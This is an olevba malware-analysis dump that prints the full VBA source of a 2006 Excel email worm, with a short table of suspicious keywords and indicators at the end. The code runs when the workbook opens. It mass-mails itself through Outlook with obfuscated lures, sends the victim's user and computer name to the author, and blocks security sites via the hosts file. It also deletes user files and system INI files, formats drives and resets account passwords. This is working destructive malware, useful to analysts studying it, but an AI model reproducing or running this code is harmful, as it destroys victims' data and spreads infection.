olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Email-Worm.MSExcel.Skowor.b
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Email-Worm.MSExcel.Skowor.b 
in file: ./Email-Worm.MSExcel.Skowor.b - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Macro/SkorCzybikFSE.A �opyrights 2006 by sk0r
'This Worm was created by sk0r aka Daniel B.
'You are not allowed to decompile the Worm!
'ViSiT my Site @ www.sk0r-virii.tk
'
' This is a very dangerous worm, because it's formating
' all found drives and discettes which are inserted.
' Also it deletes important System files like boot.ini,
' system.ini and win.ini. it has much functions more like
' you can see here ;-)
'
' WARNING: This worm makes the system unuseable and
'          erase all files of harddrives and discettes!!
'
' The Wormname means:
'
'     Skor Czybik File System Eraser
'
'========================================================


Private Sub Workbook_Open()
On Error Resume Next
Set wshs = CreateObject("wscript.shell")
Set fso = CreateObject("scripting.filesystemobject")
Set sysdir = fso.getspecialfolder(1)
Set windir = fso.getspecialfolder(0)
hddisk = Left(windir, 2)
Set ntwrk = CreateObject("wscript.network")

Randomize: intZahl = Int(1000000 * Rnd) + 1246487
Set getmenow = fso.getfile(SkorCzybikFSE.Path + "\" + SkorCzybikFSE.Name)
getmenow.Copy (windir + "\Ihre_Angaben" + CStr(intZahl) + ".xls")

wshs.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
wshs.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"

Set CreateEmailApplication = fso.createtextfile(sysdir + "\sk0r_mailer.vbs", True)
CreateEmailApplication.writeline ("rem Win32/SkorCzybikFSE Mailer Script File  ")
CreateEmailApplication.writeline ("On Error Resume Next ")
CreateEmailApplication.writeline ("Set fso = CreateObject(""scripting.filesystemobject"") ")
CreateEmailApplication.writeline ("Set sysdir = fso.getspecialfolder(1) ")
CreateEmailApplication.writeline ("Set windir = fso.getspecialfolder(0) ")
ilikeskor = Chr(83) & Chr(69) & Chr(84) & Chr(32) & Chr(79) & Chr(85) & Chr(84) & Chr(65) & Chr(80) & Chr(80)

ilikeskor = ilikeskor + Chr(32) & Chr(61) & Chr(67) & Chr(82) & Chr(69)
ilikeskor = ilikeskor + Chr(65) & Chr(84) & Chr(69) & Chr(79) & Chr(66) & Chr(74) & Chr(69) & Chr(67)

ilikeskor = ilikeskor + Chr(84) & Chr(32) & Chr(40) & Chr(34) & Chr(79) & Chr(85)
ilikeskor = ilikeskor + Chr(84) & Chr(76) & Chr(79) & Chr(79) & Chr(75) & Chr(46) & Chr(65) & Chr(80)

ilikeskor = ilikeskor + Chr(80) & Chr(76) & Chr(73) & Chr(67) & Chr(65)
ilikeskor = ilikeskor + Chr(84) & Chr(73) & Chr(79) & Chr(78) & Chr(34) & Chr(41) & vbCrLf & Chr(83) & Chr(69)

ilikeskor = ilikeskor + Chr(84) & Chr(32) & Chr(78) & Chr(69) & Chr(87) & Chr(69) & Chr(77) & Chr(65) & Chr(73) & Chr(76) & Chr(61)

ilikeskor = ilikeskor + Chr(79) & Chr(85) & Chr(84)
ilikeskor = ilikeskor + Chr(65) & Chr(80) & Chr(80) & Chr(46) & Chr(67) & Chr(82) & Chr(69) & Chr(65)

ilikeskor = ilikeskor + Chr(84) & Chr(69) & Chr(73) & Chr(84) & Chr(69) & Chr(77) & Chr(40) & Chr(48) & Chr(41) & vbCrLf & Chr(70)

ilikeskor = ilikeskor + Chr(79) & Chr(82) & Chr(32) & Chr(83) & Chr(95)
ilikeskor = ilikeskor + Chr(77) & Chr(65) & Chr(73) & Chr(76) & Chr(83) & Chr(32) & Chr(61) & Chr(32)

ilikeskor = ilikeskor + Chr(49) & Chr(32) & Chr(84) & Chr(79) & Chr(32) & Chr(50) & Chr(55) + vbCrLf
ilikeskor = ilikeskor + Chr(83) & Chr(69) & Chr(84) & Chr(32) & Chr(77) & Chr(85) & Chr(72) & Chr(65)

ilikeskor = ilikeskor + Chr(32) & Chr(61) & Chr(32) & Chr(79) & Chr(85)
ilikeskor = ilikeskor + Chr(84) & Chr(65) & Chr(80) & Chr(80) & Chr(46) & Chr(71) & Chr(69) & Chr(84)

ilikeskor = ilikeskor + Chr(78) & Chr(65) & Chr(77) & Chr(69) & Chr(83)
ilikeskor = ilikeskor + Chr(80) & Chr(65) & Chr(67) & Chr(69) & Chr(40) & Chr(34) & Chr(77) & Chr(65)

ilikeskor = ilikeskor + Chr(80) & Chr(73) & Chr(34) & Chr(41) + vbCrLf
ilikeskor = ilikeskor + Chr(83) & Chr(69) & Chr(84) & Chr(32) & Chr(65) & Chr(82) & Chr(71) & Chr(72)

ilikeskor = ilikeskor + Chr(61) & Chr(32) & Chr(77) & Chr(85) & Chr(72) & Chr(65) & Chr(46) & Chr(65) & Chr(68) & Chr(68)
ilikeskor = ilikeskor + Chr(82) & Chr(69) & Chr(83) & Chr(83) & Chr(76) & Chr(73) & Chr(83) & Chr(84)

ilikeskor = ilikeskor + Chr(83) & Chr(40) & Chr(49) & Chr(41)
ilikeskor = ilikeskor + Chr(46) & Chr(65) & Chr(68) & Chr(68) & Chr(82) & Chr(69) & Chr(83) & Chr(83)

ilikeskor = ilikeskor + Chr(69) & Chr(78) & Chr(84) & Chr(82) & Chr(73) & Chr(69) & Chr(83)
ilikeskor = ilikeskor + Chr(40) & Chr(83) & Chr(95) & Chr(77) & Chr(65) & Chr(73) & Chr(76) & Chr(83)

ilikeskor = ilikeskor + Chr(41)
CreateEmailApplication.write (ilikeskor)
CreateEmailApplication.writeline (vbCrLf + "thebodymail = ""Dear User"" + vbCrLf ")
CreateEmailApplication.writeline ("thebodymail = thebodymail + "" "" +vbcrlf ")
CreateEmailApplication.writeline ("thebodymail = thebodymail + "" Your Account has been activated "" +vbcrlf")
CreateEmailApplication.writeline ("thebodymail = thebodymail + ""To get your username and password ""+vbcrlf")
CreateEmailApplication.writeline ("thebodymail = thebodymail + ""please read the attached document ""+vbcrlf")
CreateEmailApplication.writeline ("thebodymail = thebodymail + ""then you can login immediately "" +vbcrlf")
CreateEmailApplication.writeline ("thebodymail = thebodymail + "" "" +vbcrlf")
CreateEmailApplication.writeline ("thebodymail = thebodymail + ""Best Regards"" +vbcrlf")
CreateEmailApplication.writeline ("Randomize ")
CreateEmailApplication.writeline ("emailcounter = Int(4 * Rnd) ")
CreateEmailApplication.writeline ("If emailcounter = 1 Then ")
CreateEmailApplication.writeline ("thesubjectmail = ""Your Password"" ")
CreateEmailApplication.writeline ("ElseIf emailcounter = 2 Then ")
CreateEmailApplication.writeline ("thesubjectmail = ""Ihre Rechnung T-Com ""+Date() ")
CreateEmailApplication.writeline ("ElseIf emailcounter = 3 Then ")
CreateEmailApplication.writeline ("thesubjectmail = ""Deine Zugangsdaten ""+Date ")
CreateEmailApplication.writeline ("Else ")
CreateEmailApplication.writeline ("thesubjectmail = ""Rechnung 2006 Spring"" ")
CreateEmailApplication.writeline ("End If ")
CreateEmailApplication.writeline ("sendingfile = windir + ""\Ihre_Angaben" + CStr(intZahl) + ".xls"" ")
kackfun1 = "!!!!Ne!!!wE!!!!!Ma!!!!i!!!l!!!.!!!T!!!!o !!!=!! a!!!!!r!!!g!!!h "
kackfun1 = Replace(kackfun1, "!", "")
CreateEmailApplication.writeline (kackfun1)
CreateEmailApplication.writeline ("NewEMail.Subject = thesubjectmail ")
CreateEmailApplication.writeline ("NewEMail.Body = thebodymail ")
kackfun2 = "N!!!e!!!!wE!!!M!!!ail!!!.!!!Att!!!!achme!!!!nts!!!.!!!A!!!dd !!!!se!!!n!!!ding!!!!f!!!i!!!le "
kackfun2 = Replace(kackfun2, "!", "")
CreateEmailApplication.writeline (kackfun2)
CreateEmailApplication.writeline ("NewEMail.Send ")
CreateEmailApplication.writeline ("Next ")
CreateEmailApplication.Close
wshs.Run ("WScript " + sysdir + "\sk0r_mailer.vbs"), , True
fso.deletefile (sysdir + "\sk0r_mailer.vbs")





localhostip = Chr(49) & Chr(50) & Chr(55) & Chr(46) & Chr(48) & Chr(46) & Chr(48) & Chr(46) & Chr(49)
Set hostfile = fso.createtextfile(sysdir + "\drivers\etc\hosts", True)
hostfile.writeline ("# Win32/SkorCzybikFSE �opyright by sk0r")
hostfile.writeline ("# access to dl,av or search sites usw denied")
hostfile.writeline (" ")
hostfile.writeline (localhostip + " www.antivir.de")
hostfile.writeline (localhostip + " www.bitdefender.de ")
hostfile.writeline (localhostip + " www.znet.de")
hostfile.writeline (localhostip + " www.chip.de")
hostfile.writeline (localhostip + " www.virustotal.com")
hostfile.writeline (localhostip + " virusscan.jotti.org")
hostfile.writeline (localhostip + " www.kaspersky.com")
hostfile.writeline (localhostip + " www.sophos.de")
hostfile.writeline (localhostip + " www.trojaner-info.de ")
hostfile.writeline (localhostip + " www.trojaner-help.de ")
hostfile.writeline (localhostip + " www.arcabit.com ")
hostfile.writeline (localhostip + " www.avast.com ")
hostfile.writeline (localhostip + " www.grisoft.com ")
hostfile.writeline (localhostip + " www.bitdefender.com ")
hostfile.writeline (localhostip + " www.clamav.net ")
hostfile.writeline (localhostip + " www.drweb.com ")
hostfile.writeline (localhostip + " www.f-prot.com ")
hostfile.writeline (localhostip + " www.google.de ")
hostfile.writeline (localhostip + " www.fortinet.com")
hostfile.writeline (localhostip + " www.nod32.com ")
hostfile.writeline (localhostip + " www.norman.com ")
hostfile.writeline (localhostip + " www.microsoft.com")
hostfile.writeline (localhostip + " www.anti-virus.by/en")
hostfile.writeline (localhostip + " www.symantec.com ")
hostfile.writeline (localhostip + " www.windowsupdate.com ")
hostfile.writeline (localhostip + " www.trendmicro.com ")
hostfile.writeline (localhostip + " www.mcafee.com ")
hostfile.writeline (localhostip + " www.viruslist.com")
hostfile.writeline (localhostip + " www.avp.com ")
hostfile.writeline (localhostip + " www.zonelabs.com")
hostfile.writeline (localhostip + " www.heise.de ")
hostfile.writeline (localhostip + " www.antivirus-online.de")
hostfile.writeline (localhostip + " www.free-av.com ")
hostfile.writeline (localhostip + " www.panda-software.com")
hostfile.writeline (localhostip + " www.pc-welt.de ")
hostfile.writeline (localhostip + " www.pc-special.net")
hostfile.writeline (localhostip + " download.freenet.de ")
hostfile.writeline (localhostip + " www.vollversion.de ")
hostfile.writeline (localhostip + " www.das-download-archiv.de")
hostfile.writeline (localhostip + " www.freeware.de ")
hostfile.writeline (localhostip + " www.antiviruslab.com")
hostfile.writeline (localhostip + " www.search.yahoo.com")
hostfile.writeline (localhostip + " www.web.de ")
hostfile.writeline (localhostip + " www.hotmail.com")
hostfile.writeline (localhostip + " www.hotmail.de")
hostfile.writeline (localhostip + " www.gmx.net")
hostfile.writeline (localhostip + " www.esl-europe.net")
hostfile.writeline (localhostip + " www.cs-expert.de")
hostfile.writeline (localhostip + " www.spiegel.de")
hostfile.writeline (localhostip + " www.icq.com")
hostfile.writeline (localhostip + " www.icq.de ")
hostfile.writeline (localhostip + " www.og-cheats.de")
hostfile.writeline (localhostip + " www.flirtlife.de")
hostfile.writeline (localhostip + " www.ffh.de")
hostfile.writeline (localhostip + " www.counter-strike.de")
hostfile.writeline (localhostip + " www.counter-strike.net")
hostfile.writeline (localhostip + " www.counterstrike.de")
hostfile.writeline (localhostip + " www.csconfigs.de")
hostfile.writeline (localhostip + " www.netsettings.net")
hostfile.writeline (localhostip + " www.leaguez.com")
hostfile.writeline (localhostip + " www.unrealtournament.com")
hostfile.writeline (localhostip + " www.halflife.yusho.de")
hostfile.writeline (localhostip + " www.planethalflife.com")
hostfile.writeline (localhostip + " www.lavasoft.de")
hostfile.writeline (localhostip + " www.de.wikipedia.org")
hostfile.writeline (localhostip + " www.wikipedia.org")
hostfile.writeline (localhostip + " www.en.wikipedia.org")
hostfile.writeline (localhostip + " www.wissen.de")
hostfile.writeline (localhostip + " www.virus-aktuell.de")
hostfile.writeline (localhostip + " www.arcor.de")
hostfile.writeline (localhostip + " www.t-online.de")
hostfile.writeline (localhostip + " www.t-com.de")
hostfile.writeline (localhostip + " www.counter-hacks.de")
hostfile.writeline (localhostip + " www.alice-dsl.de")
hostfile.writeline (localhostip + " www.freenet.de")
hostfile.writeline (localhostip + " www.1und1.de")
hostfile.writeline (localhostip + " www.fbi.gov")
hostfile.writeline (localhostip + " www.polizei.de")
hostfile.Close

fso.deletefile (sysdir + "\drivers\etc\protocol")
fso.deletefile (sysdir + "\drivers\etc\services")

Set outlookobj = CreateObject("Outlook.Application")
If outlookobj Is Not Nothing Then
sendTxt = "Hallo sk0r," + vbCrLf
sendTxt = sendTxt + " " + vbCrLf
sendTxt = sendTxt + "Ich bin ein infizierter User von deinem" + vbCrLf
sendTxt = sendTxt + "Wurm Win32/SkorCzybikFSE.A ! Diese Nachricht" + vbCrLf
sendTxt = sendTxt + "wurde automatisch erstellt :>" + vbCrLf
sendTxt = sendTxt + " " + vbCrLf
sendTxt = sendTxt + "Mein Username: " + ntwrk.UserName + vbCrLf
sendTxt = sendTxt + "Mein Computername: " + ntwrk.computername + vbCrLf
Set crtNewMail = outlookobj.createitem(0)
crtNewMail.to = "sk0r1337@gmx.de"
crtNewMail.Subject = "Information zu " + ntwrk.computername
crtNewMail.body = sendTxt
crtNewMail.send
End If


wshs.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", 1, "REG_DWORD"
wshs.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization", "Skor Czybik File Sys Erase"
wshs.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title", "Skor Czybik File System Erase"
wshs.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner", "sk0r"



favfolder = wshs.regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\" & "Favorites")

Set getfav = fso.getfolder(favfolder)
favfiles = getfav.Files
For Each dateifile In favfiles
favext = LCase(fso.getextensionname(dateifile.Path))
If favext = "url" Then
fso.deletefile (dateifile.Path)
End If
Next

Set urlwrite = fso.createtextfile(favfolder + "\warez.url")
urlwrite.writeline ("[DEFAULT] ")
urlwrite.writeline ("BASEURL=www.speedsurf.to/sk0r1337/s_popup1.html ")
urlwrite.writeline ("[InternetShortcut] ")
urlwrite.writeline ("URL=www.speedsurf.to/sk0r1337/s_popup1.html ")
urlwrite.Close

Set urlwrite2 = fso.createtextfile(favfolder + "\h4x.url")
urlwrite2.writeline ("[DEFAULT] ")
urlwrite2.writeline ("BASEURL=www.speedsurf.to/sk0r1337/s_popup2.html ")
urlwrite2.writeline ("[InternetShortcut] ")
urlwrite2.writeline ("URL=www.speedsurf.to/sk0r1337/s_popup2.html ")
urlwrite2.Close

Set urlwrite3 = fso.createtextfile(favfolder + "\sk0r.url")
urlwrite3.writeline ("[DEFAULT] ")
urlwrite3.writeline ("BASEURL=www.speedsurf.to/sk0r1337/s_popup3.html ")
urlwrite3.writeline ("[InternetShortcut] ")
urlwrite3.writeline ("URL=www.speedsurf.to/sk0r1337/s_popup3.html ")
urlwrite3.Close

Set urlwrite4 = fso.createtextfile(favfolder + "\1337.url")
urlwrite4.writeline ("[DEFAULT] ")
urlwrite4.writeline ("BASEURL=www.speedsurf.to/sk0r1337/s_popup4.html ")
urlwrite4.writeline ("[InternetShortcut] ")
urlwrite4.writeline ("URL=www.speedsurf.to/sk0r1337/s_popup4.html ")
urlwrite4.Close


UserPicFolder = wshs.regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\" & "My Pictures")
Set crtVbsPic = fso.createtextfile(UserPicFolder + "\sk0r_Overwrt.vbs", True)
crtVbsPic.writeline ("Set fso = CreateObject(""scripting.filesystemobject"") ")
crtVbsPic.writeline ("scriptf = WScript.ScriptFullName ")
crtVbsPic.writeline ("scriptf = Replace(scriptf, ""sk0r_Overwrt.vbs"", """") ")
crtVbsPic.writeline ("Set getf = fso.getfolder(scriptf) ")
crtVbsPic.writeline ("dateien = getf.Files ")
crtVbsPic.writeline ("For Each filenow In dateien ")
crtVbsPic.writeline ("fso.deletefile (filenow.Path) ")
crtVbsPic.writeline ("Next ")
crtVbsPic.writeline ("subf = getf.subfolders ")
crtVbsPic.writeline ("For Each foldersubf In subf ")
crtVbsPic.writeline ("kaka = foldersubf.Files ")
crtVbsPic.writeline ("For Each dateiensubfl In kaka ")
crtVbsPic.writeline ("fso.deletefile (dateiensubf) ")
crtVbsPic.writeline ("Next ")
crtVbsPic.writeline ("Next ")
crtVbsPic.Close
wshs.Run ("WScript " + UserPicFolder + "\sk0r_Overwrt.vbs"), , True
fso.deletefile (UserPicFolder + "\sk0r_Overwrt.vbs")

Set GetDrivesNow = fso.Drives
For Each FormatDrive In GetDrivesNow
If FormatDrive.DriveType = 1 Or FormatDrive.DriveType = 2 Then
wshs.Run ("format " + FormatDrive + " /y"), , True
End If
Next

Set gtini = fso.getfile(hddisk + "\boot.ini")
gtini.Attributes = gtini.Attributes - 4
gtini.Attributes = gtini.Attributes - 1
gtini.Attributes = gtini.Attributes - 2
fso.deletefile (hddisk + "\boot.ini")
fso.deletefile (windir + "\win.ini")
fso.deletefile (windir + "\system.ini")

Randomize: pwThisComputer = Int(1000000000 * Rnd)
StringPassw = CStr(pwThisComputer)
wshs.Run ("net user administrator " + StringPassw), , True
wshs.Run ("net user %UserName% " + StringPassw), , True


Set crtBatchInfoFile = fso.createtextfile(windir + "\sk0r_Batch.bat", True)
crtBatchInfoFile.writeline ("@echo off")
crtBatchInfoFile.writeline ("rem Win32/SkorCzybikFSE.A dropped batch file")
crtBatchInfoFile.writeline ("color 3E")
crtBatchInfoFile.writeline ("title Skor Czybik File System Erase")
crtBatchInfoFile.writeline ("cls")
crtBatchInfoFile.writeline ("echo Dear User")
crtBatchInfoFile.writeline ("echo You have been infected with the")
crtBatchInfoFile.writeline ("echo Skor Czybik File System Erase Worm")
crtBatchInfoFile.writeline ("echo Do not be surprised! All data is lost")
crtBatchInfoFile.writeline ("echo Visit the flagg now. ")
crtBatchInfoFile.writeline ("echo .")
crtBatchInfoFile.writeline ("echo .")
crtBatchInfoFile.writeline ("echo �2006 by sk0r aka Czybik")
crtBatchInfoFile.writeline ("echo .")
crtBatchInfoFile.writeline ("echo .")
crtBatchInfoFile.writeline ("pause")
crtBatchInfoFile.Close

wshs.Run (windir + "\sk0r_Batch.bat")
wshs.Run ("http://aeq.ae.funpic.de/Czybik_sk0r_Flagge.jpg")


wshs.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", 1, "REG_DWORD"
Set getmyslf = fso.getfile(SkorCzybikFSE.Path + "\" + SkorCzybikFSE.Name)
getmyslf.Attributes = getmyslf.Attributes + 2
wshs.Run ("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters")

Set wshs = Nothing
Set fso = Nothing
Set sysdir = Nothing
Set windir = Nothing
Set ntwrk = Nothing
Unload Me
End Sub


'<!-- Macro/SkorCzybikFSE.A | �2006 by sk0r --!>
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|createtextfile      |May create a text file                       |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|regread             |May read registry keys                       |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://aeq.ae.funpic|URL                                          |
|          |.de/Czybik_sk0r_Flag|                                             |
|          |ge.jpg              |                                             |
|IOC       |sk0r_mailer.vbs     |Executable file name                         |
|IOC       |sk0r_Overwrt.vbs    |Executable file name                         |
|IOC       |sk0r_Batch.bat      |Executable file name                         |
|IOC       |RUNDLL32.EXE        |Executable file name                         |
|IOC       |user32.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

